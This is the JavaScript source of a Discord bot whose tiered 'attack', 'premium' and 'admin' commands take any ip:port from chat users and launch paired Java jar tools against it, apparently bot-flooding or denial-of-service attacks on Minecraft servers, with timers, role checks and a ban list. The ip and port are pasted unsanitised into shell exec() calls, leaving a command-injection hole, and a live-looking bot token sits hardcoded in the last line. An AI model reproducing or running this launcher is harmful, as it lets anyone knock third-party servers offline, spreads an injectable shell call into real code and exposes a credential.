const Discord = require('discord.js');
const { exec } = require('child_process');
const fetch = require('node-fetch');

const client = new Discord.Client();
const prefix = 'neo!';
let attackInProgress = false;
const bannedUsers = new Set();

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('message', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (message.channel.id !== '1148553673677488128') {
        message.reply('You can only use commands in #⛈┊storm.');
        return;
    }

    if (command === 'attack') {
        if (bannedUsers.has(message.author.id)) {
            const bannedEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('**YOU ARE BANNED**');
    
            message.channel.send(bannedEmbed);
            return;
        }

        if (attackInProgress) {
            const alreadyInProgressEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('An attack is already in progress. Please wait.');

            message.channel.send(alreadyInProgressEmbed);
            return;
        }

        if (args.length < 1) {
            const missingArgsEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Missing IP and Port. Use `neo!attack ip:port`.');

            message.channel.send(missingArgsEmbed);
            return;
        }

        
        attackInProgress = true;

        const [ip, port] = args[0].split(':');

        if (!ip || !port) {
            const invalidFormatEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Invalid IP or Port format. Use `neo!attack ip:port`.');

            message.channel.send(invalidFormatEmbed);
            attackInProgress = false;
            return;
        }

        console.log('Attack command received:', command);

        const attackEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('Attack Launched')
            .setDescription('🚀 **THE ATTACK IS LAUNCHED** 🚀')
            .addField('Host', `${ip}:${port}`)
            .addField('Port', port)
            .addField('Sent By', message.author);

        message.channel.send(attackEmbed);

        const javaCommand1 = `java -jar /home/container/free/free1.jar -s ${ip}:${port} -p BOT_ -d 0 1 -c 50000 -r -x -m`;

        const childProcess1 = exec(
            javaCommand1,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 1:', error);
                } else {
                    console.log('Java command 1 executed successfully:', stdout);
                }
            }
        );

        const javaCommand2 = `java -jar /home/container/free2/free2.jar -s ${ip}:${port} -p BOT_ -d 0 1 -c 50000 -r -x -m`;

        const childProcess2 = exec(
            javaCommand2,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 2:', error);
                } else {
                    console.log('Java command 2 executed successfully:', stdout);
                }

            }
        );

        setTimeout(() => {
            const completedEmbed = new Discord.MessageEmbed()
                .setColor('#00FF00')
                .setTitle('Attack Completed')
                .setDescription('The attack is completed. You can send other attacks now!');

            message.channel.send(completedEmbed);

            attackInProgress = false;
        }, 90000);
        } else if (command === 'premium') {
    // Check if the user has the specified role (Role ID: 1148551882046963742)
    if (!message.member.roles.cache.has('1148551882046963742')) {
        const unauthorizedEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription('You do not have permission to use this command.');

        message.channel.send(unauthorizedEmbed);
        return;
    }
        if (attackInProgress) {
            const alreadyInProgressEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('An attack is already in progress. Please wait.');
        
            message.channel.send(alreadyInProgressEmbed);
            return;
        }
        
        if (args.length < 1) {
            const missingArgsEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Missing IP and Port. Use `.premium ip:port`.');
        
            message.channel.send(missingArgsEmbed);
            return;
        }

        const [ip, port] = args[0].split(':');

        if (!ip || !port) {
            const invalidFormatEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Invalid IP or Port format. Use `.premium ip:port`.');
        
            message.channel.send(invalidFormatEmbed);
            attackInProgress = false;
            return;
        }

        console.log('Premium command received:', command);

        attackInProgress = true;

        const attackEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('PREMIUM COMMAND Launched')
            .setDescription('🚀 **THE ATTACK IS LAUNCHED** 🚀')
            .addField('Host', `${ip}:${port}`)
            .addField('Port', port)
            .addField('Sent By', message.author);

        message.channel.send(attackEmbed);

        const javaCommand1 = `java -jar /home/container/premium/premium1.jar -A ${ip} -P ${port} -C 80000 -D 0`;

        const childProcess1 = exec(
            javaCommand1,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 1:', error);
                } else {
                    console.log('Java command 1 executed successfully:', stdout);
                }

            }
        );

        const javaCommand2 = `java -jar /home/container/premium2/premium1.jar -A ${ip} -P ${port} -C 80000 -D 0`;

        const childProcess2 = exec(
            javaCommand2,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 2:', error);
                } else {
                    console.log('Java command 2 executed successfully:', stdout);
                }

            }
        );

        setTimeout(() => {
            const completedEmbed = new Discord.MessageEmbed()
                .setColor('#00FF00')
                .setTitle('Attack Completed')
                .setDescription('The attack is completed. You can send other attacks now!');

            message.channel.send(completedEmbed);

            attackInProgress = false;
        }, 71000);
    } else if (command === 'admin') {
        if (!message.member.roles.cache.some(role => role.name === 'Owner')) {
            const noPermissionEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('You do not have permission to use this command.');
    
            message.channel.send(noPermissionEmbed);
            return;
        }
        
        if (attackInProgress) {
            const alreadyInProgressEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('An attack is already in progress. Please wait.');

            message.channel.send(alreadyInProgressEmbed);
            return;
        }

        if (args.length < 1) {
            const missingArgsEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Missing IP and Port. Use `.admin ip:port.`');

            message.channel.send(missingArgsEmbed);
            return;
        }

        attackInProgress = true;

        const [ip, port] = args[0].split(':');

        if (!ip || !port) {
            const invalidFormatEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('Invalid IP or Port format. Use `.admin ip:port.`');

            message.channel.send(invalidFormatEmbed);
            attackInProgress = false;
            return;
        }

        console.log('Admin command received:', command);

        const attackEmbed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setTitle('Attack Launched')
            .setDescription('🚀 **THE ADMIN ATTACK IS LAUNCHED** 🚀')
            .addField('Host', `${ip}:${port}`)
            .addField('Port', port)
            .addField('Sent By', message.author);

        message.channel.send(attackEmbed);

        const javaCommand1 = `java -jar /home/container/paid/paid1.jar -A ${ip} -P ${port} -C 200000 -D 0`;

        const childProcess1 = exec(
            javaCommand1,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 1:', error);
                } else {
                    console.log('Java command 1 executed successfully:', stdout);
                }
            }
        );

        const javaCommand2 = `java -jar /home/container/paid2/paid2.jar -A ${ip} -P ${port} -C 200000 -D 0`;

        const childProcess2 = exec(
            javaCommand2,
            { maxBuffer: 8024 * 8024 },
            (error, stdout, stderr) => {
                if (error) {
                    console.error('Error executing Java command 2:', error);
                } else {
                    console.log('Java command 2 executed successfully:', stdout);
                }

            }
        );

        setTimeout(() => {
            const completedEmbed = new Discord.MessageEmbed()
                .setColor('#00FF00')
                .setTitle('Attack Completed')
                .setDescription('The admin attack is completed. You can send other attacks now!');

            message.channel.send(completedEmbed);

            attackInProgress = false;
        }, 140000);
    } else if (command === 'ban') {
        if (message.member.roles.cache.has('1148551873553518663')) {
            const userToBan = message.mentions.members.first();
            if (userToBan) {
                bannedUsers.add(userToBan.id);

                const banEmbed = new Discord.MessageEmbed()
                    .setColor('#FF0000')
                    .setTitle('User Banned')
                    .setDescription(`User ${userToBan} is banned from using the neo!attack command.`);

                message.channel.send(banEmbed);
            } else {
                const mentionEmbed = new Discord.MessageEmbed()
                    .setColor('#FF0000')
                    .setDescription('Please mention the user you want to ban.');

                message.channel.send(mentionEmbed);
            }
        } else {
            const permissionEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('You do not have permission to use this command.');

            message.channel.send(permissionEmbed);
        }
    } else if (command === 'unban') {
        if (message.member.roles.cache.has('1148551873553518663')) {
            const userToUnban = message.mentions.members.first();
            if (userToUnban) {
                bannedUsers.delete(userToUnban.id);

                const unbanEmbed = new Discord.MessageEmbed()
                    .setColor('#00FF00')
                    .setTitle('User Unbanned')
                    .setDescription(`User ${userToUnban} is unbanned and can use the neo!attack command again.`);

                message.channel.send(unbanEmbed);
            } else {
                const mentionEmbed = new Discord.MessageEmbed()
                    .setColor('#FF0000')
                    .setDescription('Please mention the user you want to unban.');

                message.channel.send(mentionEmbed);
            }
        } else {
            const permissionEmbed = new Discord.MessageEmbed()
                .setColor('#FF0000')
                .setDescription('You do not have permission to use this command.');

            message.channel.send(permissionEmbed);
        }
    } else if (command === 'res') {
        if (args.length < 1) {
            message.reply('Missing server host. Use `.res host`.');
            return;
        }

        const port = args[0];

        console.log('Server information command received:', command);

        const apiURL = `https://api.mcsrvstat.us/2/${port}`;
        const response = await fetch(apiURL);

        if (response.status === 200) {
            const serverInfo = await response.json();

            const embed = new Discord.MessageEmbed()
                .setColor('#00FF00')
                .setTitle('Minecraft Server Information')
                .addField('Host', serverInfo.hostname || 'N/A')
                .addField('IP address', serverInfo.ip || 'N/A')
                .addField('Port', serverInfo.port || 'N/A')
                .addField('Protocol', serverInfo.protocol || 'N/A')
                .addField('Server Version', serverInfo.version || 'N/A')
                .setImage(`http://status.mclive.eu/NeoAttack/${port}/banner.png`);

            message.channel.send(embed);
        } else {
            message.reply('Failed to fetch server information. Please check the Port.');
        }
    } else if (command === 'help') {
        const helpEmbed = new Discord.MessageEmbed()
            .setColor('#00FF00')
            .setTitle('Bot Commands')
            .setDescription('Here are the available bot commands:')
            .addField('neo!attack ip:port', 'Launch an attack (everyone can use)')
            .addField('.premium ip:port', 'Launch an attack (only premium users can use)')
            .addField('.admin ip:port (admin only)', 'Launch an admin attack (admin only)')
            .addField('.res host', 'Get server information')
            .addField('.ban @user (admin only)', 'Ban a user from using neo!attack (admin only)');

        message.channel.send(helpEmbed);
    } else {
    }
});

client.login('MTE0ODU4NTczMTYyNzk1ODI5NA.GhM_73.2Tih4k0dcOXV-SE3ZedvFuNrkNffUhL3Lny55s');
